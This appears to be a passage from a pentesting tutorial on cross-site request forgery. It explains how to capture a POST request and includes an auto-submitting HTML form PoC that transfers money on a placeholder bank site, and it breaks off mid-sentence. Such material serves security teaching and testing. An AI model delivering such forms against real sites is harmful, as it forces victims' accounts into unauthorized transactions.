# Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) is an attack that ***forces authenticated users to submit a request to a Web application against which they are currently authenticated***. <br />
CSRF attacks exploit the trust a Web application has in an authenticated user.
We can deliver a CSRF attack via GET or POST method depending on the case.

## Basic CSRF via POST method.
### Basic CSRF via POST method EXPLANATION:
We can perform a CSRF via POST method. We have to do the action we want to exploit in our own account and capture the POST. Once we have it we have to make an html form to deliver it. 
We can use an automated resources as [CSRF PoC-Generator](https://hacktify.in/hacktify-csrf-poc-generator/), or the following script modifying it to our own situation:
```html
<html>
<body>
<form action="https://xymbank.com/online/transfer" method="POST">
<input type="hidden" name="amount" value="500"/>
<input type="hidden" name="account" value="654585" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

### Basic CSRF via POST method EXPLOITATION:
- First we obtain the POST method:<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/54d619ca-980e-43c2-aa79-b6cd7fd7047c" width="600"><br />
- Finally we create the CSRF PoC so we can deliver it to our victim:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/41cfc524-504d-4f8c-8130-fc019b00d52e" width="700"><br />







In the next example we are going to tr
